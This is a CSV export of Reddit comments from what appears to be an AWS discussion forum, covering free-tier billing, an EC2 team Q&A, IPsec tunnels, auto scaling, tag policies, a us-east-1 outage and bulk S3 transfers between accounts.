g5itzsm,iu2bio,"The author is actually an AWS expert, He's writing this article for the people you are talking about, who don't read / understand.",6.0
g5k0qip,iu2bio,"I would argue that if you can’t read, you shouldn’t even be using “the cloud”",-2.0
g5k48xc,iu2bio,"It’s not about reading, it’s about how companies purposefully mis-describe services and terms to be as vague as technically possible. Not a matter of reading, rather a matter of what do they mean by it...",3.0
g5k4aas,iu2bio,There is absolutely nothing vague about the free tier.,-5.0
g5k4ysd,iu2bio,"Well, quite some people disagree with you :-)",2.0
g5i9xat,iu2bio,What a clown.  It is called the “shared responsibility model” for a reason.  You are responsible for your own spending. If you cannot handle that stay out of the cloud.,-4.0
g5j1st0,iu2bio,The author is one of the worlds experts in aws cost management. He's making an editorial comment about the marketing of free tier and how little it actually covers when you're doing anything deeper than extremely limited use cases of a small set of services.,6.0
g5kifd4,iu2bio,"Free tier is intended on trying it out, not on using it for production. Also everything is listed on https://aws.amazon.com/free/?all-free-tier.sort-by=item.additionalFields.SortRank&amp;all-free-tier.sort-order=asc so no marketing hideout",0.0
g5kidlo,iu2bio,"Ever free tier detail is completely listed here: https://aws.amazon.com/free/?all-free-tier.sort-by=item.additionalFields.SortRank&amp;all-free-tier.sort-order=asc

So I don't get the flabbergasting at how marketing hides the details",0.0
g5j0gkz,iu0c8d,Yall got an outage,18.0
g68vo7h,iu0c8d,LOL,1.0
g5oldak,iu0c8d,"1. Do you secretly have live migration and you retire EC2 instances only when that live migration fails for some reason?
2. How far are the NVMe disks in Nitro from the actual NVMe disks (like the ones in metal instances)?",5.0
g6fuzfz,iu0c8d,"&gt;How far are the NVMe disks in Nitro from the actual NVMe disks (like the ones in metal instances)?

NVMe disks that are associated with local instance storage are physically on the same droplet where the VM is running. They are not network attached.",1.0
g6fvedz,iu0c8d,"I'm not talking about local instance stores, but rather about the EBS volumes that show up as NVMe volumes.",1.0
g6fy3a3,iu0c8d,"Our customers love EBS volumes, as they give them options for different types of workloads. Our customers measure EBS by durability, performance, and cost. Recently the EBS team released enterprise-grade storage: #EBS #io2 volume is now 100X more durable (99.999%) and has 10X better performance/GByte, helping our customers migrate their on-prem SAN workloads, gain in durability and performance, and reduce cost. More info here: [https://aws.amazon.com/blogs/aws/new-ebs-volume-type-io2-more-iops-gib-higher-durability/](https://aws.amazon.com/blogs/aws/new-ebs-volume-type-io2-more-iops-gib-higher-durability/)",1.0
g5l3szk,iu0c8d,"How many EC2 instances are currently running in AWS?

With the introduction of serverless, do you feel that EC2 will be classified as legacy tech soon?",4.0
g6demgh,iu0c8d,Not sure of the exact number but I can guarantee it’s more than 1,7.0
g6fuw4q,iu0c8d,"&gt;With the introduction of serverless, do you feel that EC2 will be classified as legacy tech soon?

EC2 is a fundamental service and building block for many applications and services. It's a service that is continuing to rapidly grow, on a large user base. As large enterprises migrate to the cloud, typically their first step is to ""Lift and Shift"" their existing on-prem application and deploy them on to EC2. We expect EC2 to continue its growth and coexist with other higher level/managed compute services such as Lambda and Fargate for the foreseeable future.",2.0
g6fqjsz,iu0c8d,"&gt;How many EC2 instances are currently running in AWS?

Amazon EC2 offers the broadest and deepest portfolio of instances in the cloud. We have more than 300 instances to suit your workload needs. We do not disclose the actual number of servers or customer instances publicly.",1.0
g6frecf,iu0c8d,Can you also address the question about EC2 becoming legacy with the advent of other services like Lambda? Is there any credence to this?,1.0
g5nh86e,iu0c8d,"lambda gets a lot of attention these days because of serverless.  can you share if ec2 plays a part in enabling lambda, and if so, some of the details",3.0
g6fqmq1,iu0c8d,Lambda uses EC2 and Firecracker as the virtualization layer. You can find out more details here - https://aws.amazon.com/about-aws/whats-new/2018/11/firecracker-lightweight-virtualization-for-serverless-computing/.,5.0
g6d9a4a,iu0c8d,"lambda runs on EC2 instances in accounts maintained by the lambda team. The lambda team would be the ones with the best info.  


When you run the lambda 'in vpc mode', it gives you a dedicated whole instance for your workloads. In non-vpc mode they're all running on separated out firecracker VMs on top of EC2 instances.  


I met with the lambda team a few years ago for work and took a mountain of notes that are on my work computer.",1.0
g68fslf,iu0c8d,Can we have a quick write up of how does EC2 work internally? I’m pretty curious on how it’s done,2.0
g6fqrdz,iu0c8d,"For a quick overview of how EC2 works, we recommend checking out this video - https://www.youtube.com/watch?v=kMMybKqC2Y0.",2.0
g6co1j8,iu0c8d,EC2 Inf  instances are geared towards machine learning inferencing. What is the future direction of EC2 for other applications like HPC etc?,2.0
g6fsni0,iu0c8d,"We are constantly expanding our portfolio of EC2 instances to better serve the needs of particular applications or workloads. As a datapoint, we currently offer 300 instances, which is roughly 2X more than what we offered 2 years back. We would love to understand if there are use case or applications that we are currently not serving well today.",2.0
g6fvcpi,iu0c8d,"Thank you for the answer. 

What is AWS EC2’s take on customers using these pre-built instances or would having a custom instance where they select the exact CPU cores, memory and bandwidth is a model that will be more helpful to them?0",2.0
g6fxlvh,iu0c8d,"AWS EC2 customers represent every imaginable industry segment. We are always seeking to learn of new use cases our customers need, and so we fully expect more server configurations options to be needed in the future. If you have a specific use case in mind that is missing, we would love to hear about it.",2.0
g6fzxk8,iu0c8d,Thank you,1.0
g6dkzeu,iu0c8d,"do the aws ml services like personalize, forecast, comprehend, etc. run on Inf1?",2.0
g6fr3hz,iu0c8d,"Amazon's Alexa team is in the process of moving their Text-to-Speech workload over to Inf1 instances. Other AWS ML services, such as the ones you listed, are actively working on their migrations.",3.0
g6dlg1h,iu0c8d,what is the ml benchmark suite(s) used for the 30% higher throughput and 45% lower cost numbers?,2.0
g6frh92,iu0c8d,"These numbers represent Inf1's performance across a wide set of benchmarks involving models such as BERT, ResNet50, SSD, and others. Our benchmarks try and mimic real-world implementations and measure end-to-end inference performance and not just look at theoretical/synthetic performance.",3.0
g6fpx22,iu0c8d,Is the team launching EC2 Inf1 instances the same team that is responsible for other EC2 instances like for General Purpose computing or are those handled by separate EC2 teams?,2.0
g6fsplz,iu0c8d,"As you can imagine, EC2 is a large organization with many cross functional and independent sub-teams. In order to effeciently address the needs of our broad and diverse customer base, we have separate teams that own the development and delivery of different instance families.",3.0
g5hpcuv,iu0c8d,"View in your timezone:  
[Sep 24th , 9AM PT][0]  

[0]: https://timee.io/20200924T1600?tl=We%20are%20the%20AWS%20EC2%20Team%20-%20Ask%20the%20Experts%20-%20Sep%2024th%20%40%209AM%20PT%20%2F%2012PM%20ET%20%2F%204PM%20GMT!",1.0
g5ksi2e,iu0c8d,"\&gt;   to answer any questions you may have about **deploying your machine learning models to Amazon EC2 Inf1 instances** 

This is an awfully specific thing to be answering questions about.",1.0
g6fr0dd,iu0c8d,"RDS (Postgres) or Postgres on EC2?

which one would yield better performance? Considering an app receives traffic under 10k daily.",1.0
g6fvptb,iu0c8d,When will IPv6 make it to NLB'S ?,1.0
g5is47d,iu0c8d,"Hey guys! I am thinking about writing a GUI desktop app that uses your CLI. 
I want to display all active items like created instances, dbs, or vpcs. My app would do it by calling the list command. Would it cause problems on your end if you receive so many requests from my app when it refreshes the data?",-2.0
g5it9g9,iu0c8d,"You would get rate limited if you make more calls than your limit. The exact number will depend upon the API that is being used and also whether the limit is a hard limit or a soft limit.  Keep in mind some API calls can be really expensive such as Cloudwatch getMetricData or GetMetricStatistics if you are using them to plot the dashboard.   


The AWS console is essentially a wrapper around the publicly available APIs but I believe they would have higher limits from API calls that come from console and in fact they might be private APIs that are only whitelisted for console. Typically that would be stuff that can you do only from console but not from CLI.",9.0
g5jtj0s,iu0c8d,"If you manage to take down the largest cloud provider in the world with a single desktop app using the CLI, I would be impressed.",4.0
g5jtygx,iu0c8d,"Hahahahaha, I didn’t think about it this way.",-1.0
g5jayzy,iu0c8d,"You can already use the Tag Manager for this, in the aws console.",2.0
g5jieb9,iu0c8d,I’m doing it as a coding project,1.0
g5k0zlq,iu01uj,"One common approach is to add tags to the EBS volume, like AZ, role, application",1.0
g5hua9p,ityafv,"ASA's didn't support multiple peers with IKEv2 until 9.14.x release. If you're not on 9.14 you'd need to use IKEv1 for multiple peers.

Phase 1 and 2 need to have a matching set of encryption/hashing/PFS/etc on both sides. Both sides present the crypto policies they support, and the most-preferred one that matches on both sides should be chosen. 

e.g. ""I support aes256-sha1, aes128-sha1, and 3des-md5"" - ""well I support aes128-sha1 and 3des-md5"" - then they'd use aes128-sha1. If one side has a weaker set more-preferred, it may get chosen over a stronger but less-preferred option. However, the tunnel should still build phase 1+2 and support communication as long as they share a common set. If one side only supported aes and the other only supported 3des, you wouldn't see the phases establishing.",1.0
g5i1w7x,ityafv,ok so Phase 1 does not need to be exactly as Phase 2 as long as it matches other end,1.0
g5i52nl,ityafv,"Phase 1 and 2 don't need have the same settings as each other (e.g. you could have aes-256 in phase 1 and aes-128 in phase 2), they just need to match between the two endpoints (Phase 1 on Side A needs to match Phase 1 on side B)",1.0
g5p9h7q,ityafv,"Thanks, on the ASA how do I test that if AWS peer 1 goes down AWS peer 2 establishes a connection?

Do not see how I can disable the tunnel-group for peer 1, do I need to remove the tunnel-group peer1 config to simulate or is there an official way to simulate? (Maybe on AWS Side to bring peer 1 down manually)",1.0
g5htchl,iu0qto,Could it be scaling group min required set to 2? Did you check it?,1.0
g5hv12r,iu0qto,"Min is 1, max is 4. Currently 3 healthy instances - cpu is 0.7%

Edit to add:
One ec2 instance has been active 545 days, another 121 days, the other is 90 days.

Seems like it's impossible for the app to scale back down.",1.0
g5j20ug,iu0qto,"I think by default it scales up and down based on network throughput. It checks the total bytes sent for the auto scaling group. You can see this graphed out in CloudWatch if you find the corresponding alarm. Maybe your setup, even if CPU usage is low, is still sending enough data on the network across both machines.",1.0
g5nyczv,iu0qto,Change desired count,1.0
g5ohi2t,iu0qto,I don't see the word desired anywhere. I have just a min and max (1 and 4).,1.0
g5l4n6o,itz955,"You can set Tag policies with AWS Organizations

https://aws.amazon.com/blogs/aws-cost-management/cost-allocation-blog-series-3-enforce-and-validate-aws-resource-tags/",1.0
g5l512n,itz955,"Yes but read my post, I am talking about Org SCP and tag policies. There is a problem when EC2 is deployed using CloudFormation. Even when tags are present, you are blocked from deploying.",1.0
g5l5b48,itz955,"Yes and read the blog. They enforce CloudFormation and stack tags, so your resources created through it get the tags.",1.0
g5l5sw7,itz955,"And at the bottom of the blog you sent it says...

""Please note: AWS CloudFormation does not support tag policies enforcement at the moment...""",1.0
g5l8b38,itz955,"And if you read the blog post at a whole, you'd see they use a SCP to deny creation of CloudFormation stacks without the required tag.",1.0
g5l8fj7,itz955,"Yes, you can use SCP here, but not for EC2 resources which is the point of my post.",1.0
g5l8qgv,itz955,"Read the blog and you see it's only denied for the CF stack, not for the EC2 instance. Stack tags are inherited by most created resources.",1.0
g5l9e1n,itz955,"Yes, stack tags are inherited but I have also tested this and reported it to AWS as it doesn't seem to matter how tags are applied (stack or resource), the resource gets created before the tags are applied because of the limitation with the RunInstancesAPI. The bottom line, no matter how the error reads, you cannot deploy the EC2 in CloudFormation even if you have the right tags.",1.0
g5la3g7,itz955,Do you still have a Tag Policy for EC2 instances? This should be removed in this case,1.0
g5ladrj,itz955,Not in this case. I am purely using SCP to deny creation of the tag keys are not present. Later I tried tag policies to also enforce existing resources but I am getting ahead of myself.,1.0
_,itz955,,
g5hf5ci,itynev,Are you asking how much data as a whole all of AWS services/customers consumes?,2.0
g5hfc36,itynev,Yes?,1.0
g5hrkp9,itynev,"For traffic ""inside"" of AWS they charge their own rates for moving data that you'll need to look at. If you use an EC2 instance in AWS to talk to another AWS service it wouldn't count toward your agreement with your ISP on data limits.

The 14$ = 40GB agreement that you mention is going to consist of data you send between you and AWS on your local internet link. Think about what you would upload or download from your computer to the cloud, you'll need to calculate your own average consumption for that.",1.0
g5hrvqj,itynev,"are you asking about a specific service you would be connected to all day long like Workspaces?  


otherwise AWS consumes only the traffic you send it, the traffic it gets has nothing to do with you if you aren't using it",2.0
g5hy5e5,itynev,"I would agree with this. I've had to access my instances from a phone with an expensive data plan and interacted with the AWS console. Didn't even notice a bump over my regular browsing. The exact amount would depend on what you're doing.

However, moving large data files is another thing. In that case I recommend using SCP or your preferred method to copy files directly to the server from an online source without using your device.",1.0
g5iu3d5,itynev,"Anywhere from 0, to virtually unlimited.

Do more research before you end up with an insane bill. You do not understand AWS.",1.0
g5hgz70,ity388,"Does the second curl ever give you the right response? If not, there could be a few reasons for that:

\- does ""some domain"" route correctly to your load balancer?

\- is your load balancer pointing to the target group?

\- are security groups configured correctly?

I am a bit confused when you say ""web server inside VPC"" - is that an EC2 instance? Could you talk about the setup for ""some domain"" and how it's connected to the ECS target group?",1.0
g5k6lx2,ity388,"SOLVED, finally I know what happen

one the subnet that associated with load balancer doesn't have any internet gateway

simply by creating new subnet with internet gateway and re-associate it with load balancer solved the problem",2.0
g5ju5tj,ity388,"Let me clarify,
I run the curl command inside the ECS instance it self, I also can `curl localhost`

The curl with IP always give back correct response, the curl with domain is slow, but also return correct response.

I also tried accessing the website with browser on my pc, it is randomly fast/slow, it's not normal because it is only serving a line of text

Yeah, I already triple checked, it is pointing to the right ECS instance

The setup is like this:

- The domain pointing to load balancer.
- Then the load balancer have listener port 443 forward to target group with port 80 to ECS instance

And yes, this is ECS-EC2, not ECS- Fargate.

I think the load balancer is the culprit that make the connection to ECS Instances slow. Because using the connection with domain will go through the load balancer, right?
And when I curl to the ECS instance IP, it is instantly giving correct response",1.0
g5halao,itxf62,Not really; You could script something that when your VPN connects it adjusts your Security Group rules automatically.,2.0
g5hqopf,itxf62,"Yup. This is it.
  
###Get your external IP in Powershell:  
    $(Invoke-WebRequest -UseBasicParsing -Uri https://api.ipify.org).content
  

Then use AWS CLI to update rules in a ""read, delete, add"" action.  
  
You could use the AWS SDK and any language. No wrong answer here. I like using the CLI because it's the same on Windows and Linux. And speed of execution isn't a priority for my simple scripts.",2.0
g5h8kmb,itrmrh,"Use signed URLs. They are only good for that URL, and for a limited amount of time. You could have your authenticated API give a 302 to the signed URL. You can do a signed URL for S3 or Cloudfront, whatever you prefer.",5.0
g5hg3o0,itrmrh,"Use CloudFront with OAI to restrict access to your S3 from CloudFront only. Use signed url too, this way you lower the requests to your S3 bucket, your content will be delivered from nearby CloudFront edge locations, your content will not be publicly available on S3 and only your authenticated users will have access to the content.
Hope this helps!",2.0
g5hhllm,itrmrh,"If optimizing for speed is one of your main requirements, serve these files via CloudFront. It should be faster on average to serve these files from Cloudfront compared to accessing S3 directly.

Cloudfront lets you serve private content [using signed URLs and signed cookies](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/PrivateContent.html).",2.0
g5h1qc3,itwd8q,Friends dont let friends use us-east-1,65.0
g5h8f7t,itwd8q,Dumb question but what's wrong with us-east-1?,23.0
g5hgsnt,itwd8q,us-east-2 is the gem.,16.0
g5hm8v8,itwd8q,"ssssh, lets keep it a hidden gem",10.0
g5hoa54,itwd8q,Omg.  Are you the other guy there with me?    Feels like seeing one other person in an empty stadium.,12.0
g5hzxrn,itwd8q,For how long? Every default account we create using the api or console defaults to this region. I assume AWS will need to change the default region again similar to the us-east-1 situation.,2.0
g5i3anw,itwd8q,until us-east-3 comes online.,7.0
g5ia68j,itwd8q,I want it bad.,1.0
g5iaezg,itwd8q,i suspect texas will come before it.,2.0
g5ixss4,itwd8q,yep...four years ago we migrated \*most\* of our infra from 1 to 2 and always am reminded it was the right decision when east-1 has issues,1.0
g5j389f,itwd8q,"I sometimes wish there were secret AZ's or even regions that if /u/jeffbarr  likes you he gets you into the club.  

MARS-4 AZ45 or some shit.    but its really just a laptop under his desk chugging away.",3.0
g5h8n7o,itwd8q,"Its generally the first place anything new gets released, so has disproportionately high number of crashes/downtime. The big S3 outage a couple of years ago was us-east-1, for example.

Also its the oldest AWS region. That in itself isnt a challenge but probably has the most technical debt (this is unsubstantiated, btw), or number of users, which might cause other issues.",43.0
g5h9cbo,itwd8q,"Makes sense, thanks!",10.0
g5i2vnf,itwd8q,"Definitely not the first region where things are released. Usually the smaller regions get stuff first. But us-east-1 is their oldest and by far the biggest region which is the cause of most issues.

Edit: typo",1.0
g5i4nx8,itwd8q,Really? I'm pretty sure if you look at some of the features they roll out there first. Albeit its been a couple of years since I've touched aws,7.0
g5jyk8x,itwd8q,"Yeah, new features/services are almost always released in us-east-1 first (together with other regions) but that's usually controlled via feature switches. The deployments go out beforehand and us-east-1 is not the first in the deployment pipeline. The idea is to reduce the blast radius of a deployment and hitting the biggest region with the most / biggest customers first would be a bad idea.",1.0
g5kfl39,itwd8q,"\&gt; The idea is to reduce the blast radius of a deployment and hitting the biggest region with the most / biggest customers first would be a bad idea. 

&amp;#x200B;

You aint wrong, but us-east-1 does still keep getting balsted!",1.0
g5iy11t,itwd8q,by far the biggest...I think at least 2-3x larger than most other regions,1.0
g5hfbfv,itwd8q,Good point. I \*think\* that outage was in 2017.,1.0
g5hvxzc,itwd8q,I once heard it referred to as the YOLO region.,3.0
g5hwmu8,itwd8q,Youre only Live once?,8.0
g5h34ye,itwd8q,"Same here - extreme slowness, unable to describe instances, etc. Not to worry though the status page says everything is operational so there's no problem and this is just in our heads.",13.0
g5h3akb,itwd8q,Check your Personal Health Dashboard. They posted an update at 14:30 UTC. I guess status page takes longer to update.,6.0
g5h3ox9,itwd8q,Well I'll be damned. Thanks for pointing that out. I withdraw my misplaced ire.,6.0
g5h51t7,itwd8q,"How unreasonable of you to expect that the status page would show the status.

""Personal Health Dashboard"" sounds like where they're going to tell you it's all in your head. It's a great way for them to avoid admitting they have a widespread problem.",7.0
g5ivm5e,itwd8q,you remember when the status page was hosted on the same region that there were problems in,1.0
g5h1b04,itwd8q,"Same here, was just going to post this as well. Other regions seem fine.",5.0
g5h4jpq,itwd8q,Glad I am subbed here. Lol,4.0
g5h4x3o,itwd8q,Personal Health Dashboard reports this as resolved now.,5.0
g5h4u5s,itwd8q,"""*learn to use the CLI*"" comment coming in 3, 2, 1 ...",8.0
g5hvmhm,itwd8q,"I mean, if you can use the CLI this is a minor inconvenience, if you can’t it could be a showstopper...",7.0
g5iadyb,itwd8q,"I’m not sure why you’re being downvoted. There are loads of cases where the CLI isn’t an option.

For example if you’re in an environment with federated authentication and aren’t able to use/don’t have an auth bridge for the CLI.",7.0
g5ihi9b,itwd8q,"Very true!

Equally there are cases where the console isn’t an option. ive worked places where the security posture was that everything is done via CLI/programmatic API/CFT to help prevent that accidental “oops i clicked the EC2 under yours when i was deleting” scenario. 

definitely not arguing one is better than the other, just suggesting being competent at both would be the best way to not be stuck waiting on AWS to fix this problem.",2.0
g5j546f,itwd8q,Or if you're using services that just don't have APIs. For instance AWS SSO is entirely a Console thing only.,2.0
g5jno6s,itwd8q,"Yep!

Although, to that example, they just released APIs for AWS SSO! Woooo! :)",2.0
g5jtnj2,itwd8q,"Well, I'll be... You're right: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/sso-admin/index.html",1.0
g5kqdfj,itwd8q,"It was like last week, so your example is still relevant! I doubt many shops have had the opportunity to incorporate these APIs yet anyway.",1.0
g5ilzjt,itwd8q,The console uses the same aws APIs. Often if the console isn’t working it means the CLI won’t either.,5.0
g5nzqy4,itwd8q,"I still wasn't able to \`aws iam list-roles\`, it just returned blank.

Also, guys.... you do realize the AWS Console just extends the AWS API.. right? They aren't different services. It's all the same under the hood.",1.0
g5h1efn,itwd8q,Same here.  Looks like console in us-east-1 is borked.,3.0
g5h1x09,itwd8q,"us-east-1 is definitely having issues (unable to launch instances, list anything, etc)",3.0
g5h3b93,itwd8q,"us-east-1, you are breaking my heart.",2.0
g5haeth,itwd8q,tire-fire-1 you mean?,2.0
g5h1371,itwd8q,Same,1.0
g5h1e78,itwd8q,"Yes same here, came here for this exact reason",1.0
g5h1fdb,itwd8q,+1,1.0
g5h1jkz,itwd8q,"Ditto, of course status page is all green right now",1.0
g5h26tl,itwd8q,Some improvement in the last few minutes,1.0
g5h2mbj,itwd8q,Yep. It is affecting our builds right now.,1.0
g5h4ukx,itwd8q,"Yes, came here when I first got the issue.",1.0
g5h56cf,itwd8q,Can confirm.,1.0
g5h99nl,itwd8q,"We had some issues with ecs and ecr, but everything is working again",1.0
g5hje7e,itwd8q,"The issues have since cleared up for me, but I was having issues around when you posted this.",1.0
g5hmm33,itwd8q,Yes! Noticed this happened for an hour every day around the same time for 4 straight says last week. Support kept insisting everything was working fine and kept blaming my ISP. I thought I was going crazy. Thank you for bringing this up.,1.0
g5i2111,itwd8q,Console still extremely slow in all regions.,1.0
g5irfcz,itwd8q,IAM access timeout.  It's not just us-east-1 I think.,1.0
g5ita29,itwd8q,"I didn't know why `terraform plan` had suddenly stopped working, but know I think I've figured out the cause lol

IAM issue in eu-west-1 too.",1.0
g5k94zv,itwd8q,I'm having issues with the new management console menu.,1.0
g5kj26v,itwd8q,Check console updates,1.0
g5h2b25,itwd8q,"So far AWS status seems to be solid green (10:28ET)

[https://status.aws.amazon.com/](https://status.aws.amazon.com/)",1.0
g5hchmk,itwd8q,First time?,11.0
g5hmrq6,itwd8q,Does this really work? I’m not used to health checks.,1.0
g5iqwkp,itwd8q,"It does, but no where near the real-time most people would expect of it.

If something major is happening, you’ll see it on the OG-AWS slack or here as a lost long before the status page informs you.",2.0
g5iwpd0,itwd8q,No it’s a lie. We’ve had status page not get updated for an hour after major issues.,2.0
g5iy58v,itwd8q,"I checked it today and it was all green, when it obviously wasn’t. Reddit was way faster.",1.0
g5h76z2,itwd8q,Lol,3.0
g5h7ous,itwd8q,"Still solid green status

[https://status.aws.amazon.com/](https://status.aws.amazon.com/)

&amp;#x200B;

Anytime now, u/aws :-D",1.0
g5h7vjk,itvd0f,"I’ve had success with using the AWS cli ‘s3 sync’ from an ec2 instance.  This utilizes internal pipes in AWS so your work/personal network speed is not relevant

Can do simple concurrency by syncing on different prefixes instead of the whole bucket at once

Just give the ec2 the IAM role you created from the first link and you’re good to go

https://aws.amazon.com/premiumsupport/knowledge-center/copy-s3-objects-account/

https://aws.amazon.com/premiumsupport/knowledge-center/s3-improve-transfer-sync-command/",10.0
g5khmxj,itvd0f,"&gt;this actually work? I didn’t think that s3 as source and destination was supported in data sync.

This.  Enable VPC endpoints as well to make sure you don't go through AWS n/w and not internet as that will be faster.  Alternatively, on your EC2 instance, if you're files have an easy pattern to exploit A-M/N-Z 50%/50% you can use xterm/multiple terminals and run  an 

$&gt; s3 cp &lt;s3://source&gt; &lt;s3://dest&gt;  --exclude ""\*"" --include ""a\*""  --include ""b\*"" --include ""c\*""

$&gt; s3 cp &lt;s3://source&gt; &lt;s3://dest&gt;  --exclude ""\*"" --include ""d\*""  --include ""e\*"" --include ""f\*""

etc in each term.  parallel processing baby!  run an s3 sync at the end to clean up anything you missed",2.0
g5ixq81,itvd0f,"I had to do a very similar exercise but with 22TB.
I tried using data sync and the aws cli 'sync' commands, but the one that worked the best was S3 Batch ops: 
https://docs.aws.amazon.com/AmazonS3/latest/dev/batch-ops.html   
Pretty easy to use, just setup a S3 inventory, then feed that into the batch operation.  
I had an additional step as some of the data was already in the second bucket.  
For this I just took a inventory of both buckets, fed that into Athena, filtered the results of the source inventory against the target inventory, then fed the results into S3 Batch.   
As the buckets are in different accounts, just make sure to set a RoleArn that has access to both.",5.0
g5j1skg,itvd0f,"Came here to say this, batch operations is your beat option.",3.0
g5gxznf,itvd0f,Ask AWS support,15.0
g5j4027,itvd0f,"Just don’t ask them to do it for you, because they can’t :)",2.0
g5jlqf4,itvd0f,No in this case I’m pretty sure they do,-1.0
g5jrs8o,itvd0f,"They can work with the service teams to enable existing object replication for CRR/SRR, but that is it. Configuring it is still on you.",3.0
g5kh38l,itvd0f,"You’ll have to forgive my lack of knowledge in this area, I just remember the other week someone had the same query and was directed by more knowledgeable people than I on how to proceed",2.0
g5khp1h,itvd0f,also the lead time on getting that setup at present is like 2-3 weeks i believe so factor that into your timelines,2.0
g5jp66t,itvd0f,[deleted],0.0
g5jrazv,itvd0f,"Nope, AWS support cannot touch any customer resources. You’re thinking of Professional Services.",2.0
g5jtiru,itvd0f,Correct my bad,1.0
g5gxhgt,itvd0f,"Datasync or replication are going to be the fastest tools for this. 


https://aws.amazon.com/datasync/",4.0
g5j3eh8,itvd0f,Data sync doesn’t support s3 as source and destination. At least not yet.,2.0
g5j5g2s,itvd0f,Docs say otherwise I believe.,-1.0
g5jlj9s,itvd0f,"DataSync does not support S3 to S3 transfers.
https://docs.aws.amazon.com/datasync/latest/userguide/working-with-locations.html",2.0
g5h11ei,itvd0f,I second datasync. I have used this service to copy 3+TB from an S3 bucket in one account to EFS in another.,1.0
g5hbuck,itvd0f,Any guides on how to do this using S3 and the source and S3 and the destination? I see how to do it between EFS and S3.,1.0
g5hxd4c,itvd0f,"You can create a task with the source and destination S3 buckets in different accounts. 

Ping support or check the FAQ's https://aws.amazon.com/datasync/faqs/

The data sync agent instance you create will need to have an IAM role associated that specifies access to the S3 buckets in each account.",2.0
g5hhree,itvd0f,How long did it take for that 3tb?,1.0
g5hjy73,itvd0f,3-4 days,2.0
g5gwoo1,itvd0f,May not be relevant since the case is different but very recently there was this discussion https://news.ycombinator.com/item?id=24463856,1.0
g5hymjl,itvd0f,[https://docs.aws.amazon.com/AmazonS3/latest/dev/replication.html](https://docs.aws.amazon.com/AmazonS3/latest/dev/replication.html),1.0
g5isip7,itvd0f,[deleted],1.0
g5j1pl9,itvd0f,Does this actually work? I didn’t think that s3 as source and destination was supported in data sync.,1.0
g5j31sd,itvd0f,"ah shit yeah you're right. I just tried it out in console, woops, bad advice

I've only tried datasync for EFS-&gt;S3, I just assumed S3-&gt;S3 would work",1.0
g5j368u,itvd0f,Heh no worries. Only reason I knew that is I made the same assumption and was surprised that it isn’t supported.,1.0
g68ccp7,itvd0f,"I wound up finding the page below and used replication with the copy to itself method.

&amp;#x200B;

[https://aws.amazon.com/premiumsupport/knowledge-center/s3-large-transfer-between-buckets/](https://aws.amazon.com/premiumsupport/knowledge-center/s3-large-transfer-between-buckets/)",1.0
g5j8bjh,itvd0f,https://medium.com/poka-techblog/aws-s3-batch-operations-beginners-guide-9573017f18db,0.0
g5gs2az,ituisc,"I'm not saying it's the ""best"" or ""correct"" way, but we just use update stack and upgrade manually in a change window. Yes, the odds of a minor unattended upgrade hanging are tiny but it's just one less thing to worry about.",3.0
g5gv29z,ituisc,"My opinion only. If you’re tracking through code in production, I don’t love automatically updating the version magically. Reason being is that it makes it harder for other developers in the code base to see when something changed (as you are seeing). I prefer to have the entire audit trail be part of the code base where the Cloudformation code is. 

Con: you have to manually update the version and push the stack update, but you can script/automate that if you’re so inclined.",3.0
g5gxksn,itraqb,"It's getting to the stage of being worthwhile writing an independent console. They have literally ruined everything they touched.  


The worst thing about this new console. Role history used to have (thanks to the Chrome AWS Extend Switch Roles"" plugin) all 30 or so accounts I regularly use.

This is a breaking change for me, I am raising a support request right now to say ""Turn this shit off"".  


Now it has returned to the default 5 most recent. WTF? NO. This is SERIOUSLY fricking broken.

And new stuff is written like it is someone totally braindead writing it. eg The search bar in EC2 you can type in virtually anything you want to search for as is. Like a partial IP address. It finds it.

  
Go to some consoles and you have to choose what you want to search by (when there is only one thing you can search by) then choose the operator (only ""equals"" is available) and then type in the ridiculously long full name of  the thing you're looking for. No substring/partial matches, no searching fields other than the one or 2 you're given.",11.0
g5gt192,itraqb,"I do not understand their “new” consoles at all. Every single change they make is so horrendous. The new SQS console is bad, the EC2 one is worse, and now this..",8.0
g5gwgav,itraqb,"Would love to see AWS making a good UI, and it being the same in all products. Each page looks totally different...",4.0
g5h1ikz,itraqb,"Seriously that's an issue for me, every service just has a new UI design",2.0
g5h587s,itraqb,"It’s probably because I’m rather inexperienced, but I like the new EC2 console. What do you think is wrong with it?",2.0
g5h4kml,itraqb,Sounds like you should sign up for http://vantage.sh/,-1.0
g5i2eij,itraqb,"No, they stated that they are not planning on an open-source version and want to achieve faster speeds by using server-side caching of resources. And that's pretty much an absolutly fucking no go IMO.",5.0
g5inhsl,itraqb,"Nah, AWS CLI and Terraform are just fine. ;) I don't trust this project, sorry.",2.0
g5h8fdt,itraqb,[deleted],4.0
g5inmuo,itraqb,Didn't know about this. Will do!,1.0
g5gp90s,itraqb,How did you get the new look ?,2.0
g5gv6xw,itraqb,"It seems to be applied randomly to some accounts. Out of our 20+ accounts, I’ve only seen it on 2 accounts. Other accounts still have the old menu style.",1.0
g5gq2rl,itraqb,Do they support dark mode now or is that a browser extension?,2.0
g5gv1ye,itraqb,"When you drop down the services menu on the top, that’s the view now instead. Any pinned services that were previously always visible at the top are now accessible on the left hand side when dropping down services.

I’m not opposed to the look, I think it looks a lot cleaner.",1.0
g5gy74c,itraqb,Also when you have a lot of accounts the dropdown next to region to see what account you are in shows the account number. I dont want to become rain man and recall 30+ aws account numbers,2.0
g5ia2ju,itraqb,"Yes!  I love the new look too but I'm really, REALLY missing the shortcuts.  Damn, I'm gonna have to make my own bookmark folder!",2.0
g5h8j5i,itraqb,Did the ability to sort the list from a-z disappear? The categories are becoming useless with all the overlap,1.0
g5hhqi4,itraqb,"One thing that's bugging me (I'll get over the icons on the banner) is that if I use this ginormous drop-down and ctrl-click the service I want to open in a new tab, this ginormous drop-down stays open on the original page and requires an extra click to close.

Just left feedback via the feedback link.",1.0
g5gooiv,itpmvw,"As a workaround for the downtime, you could snapshot the encrypted volume and then spin a new volume up using the snapshot for the 'dd' processing to read from. It won't be any faster to run through overall, but it would significantly reduce or even eliminate (depending what that volume is used for etc) the downtime requirement.",1.0
g5gowrd,itpmvw,"What instance type and volume types are you using?  24 hours for 1.5 TB seems slower than I would expect.

Some instance types (like t-series) have low IO bandwidth.  

The write will be the expensive operation.  You could try to write into target volumes with provisioned IOPS as well.",1.0
g5gu2r3,itpmvw,"Yeah, you'll want to jack up the instance class on the AWS side, that will get you more throughput and (depending on how large of a machine you're using) you won't get throttled.

I'd go at least 2XL.",1.0
